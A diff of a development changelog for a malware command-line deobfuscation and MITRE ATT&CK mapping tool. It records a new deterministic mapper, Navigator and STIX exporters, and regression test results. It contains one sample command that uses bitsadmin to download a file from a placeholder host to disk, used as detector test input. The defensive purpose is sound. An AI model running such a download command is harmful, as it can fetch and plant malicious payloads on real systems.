@@ -5,7 +5,7 @@ Build a deterministic-first analyst workspace that decodes / reconstructs
 obfuscated malware command lines with zero AI hallucinations, honest
 "partial reconstruction" verdicts, and full analyst trace.
 
-## RC5 · Semantic Execution Engine (in progress) — Feb 24, 2026
+## RC5 · Semantic Execution Engine (in progress) — Feb 21, 2026
 
 **Motivation:** Legacy engine's semantic layer is heuristic (keyword regex
 drives verdicts / MITRE / LOLBIN). RC5 replaces it with a **deterministic
@@ -16,6 +16,19 @@ derives every conclusion from graph evidence.
 **Specs authored (source of truth):**
 - `/app/memory/RC5_SEMANTIC_ENGINE_SPEC.md` — 21-section architecture spec (v2).
 - `/app/memory/RC5_PLUGIN_API.md` — frozen plugin contract for future parsers/detectors.
+
+### RC5 · Phase 5 · MITRE ATT&CK v2 (Feb 21, 2026 — SHIPPED)
+
+**Delivered:**
+- `backend/engine/detectors/mitre_mapper.py` — deterministic `Behavior[] → MitreMapping[]` mapper. 32 rules (execution / persistence / defense-evasion / credential-access / C2 / exfil / impact / collection). 1:N behavior→technique support. Each mapping carries `evidence_behavior_ids`, `evidence_node_ids`, `data_sources`, `detections{sigma,kql,spl,aql}`, confidence, rule_id. No regex on raw text.
+- `backend/engine/detectors/mitre_navigator_export.py` — ATT&CK Navigator v4.5 layer builder (`enterprise-attack`, ATT&CK v14). Deterministic JSON, gradient + legend, technique scores from confidence.
+- `backend/engine/detectors/mitre_stix_export.py` — STIX 2.1 bundle builder. `identity` + `attack-pattern` (one per technique) + `x-nivxray-mapping` (evidence-preserving custom SDO) + `report`. Stable UUIDs via sha1.
+- `/api/rc5/parse` extended: added `mitre`, `mitre_navigator`, `mitre_stix` response fields; `plugin_versions` now advertises `mitre_mapper`, `mitre_navigator`, `mitre_stix`; `decode_chain` gained `mitre_v2` step.
+- **117 Phase 5 regression tests** across 5 files (rule matching +ve/-ve, 1:N merges, parser→interpreter→mapper E2E, exports, invariants + kill-list §13 static-import gate).
+- **Full RC5 suite: 459 pass, 0 fail.**
+- **Live verification:** `bitsadmin /transfer job http://x.tld/a C:\a.exe` (cmd) → T1105 (conf 92, R-C2-DOWNLOAD) + T1197 (conf 90, R-C2-BITS), each with 1 evidence behavior + 1 evidence node.
+
+**Compliance report:** `/app/memory/RC5_PHASE_5_COMPLIANCE.md`.
 
 ### RC5 · Phase 4.5 · `/api/rc5/parse` Diagnostic Endpoint (Feb 24, 2026 — SHIPPED)
 
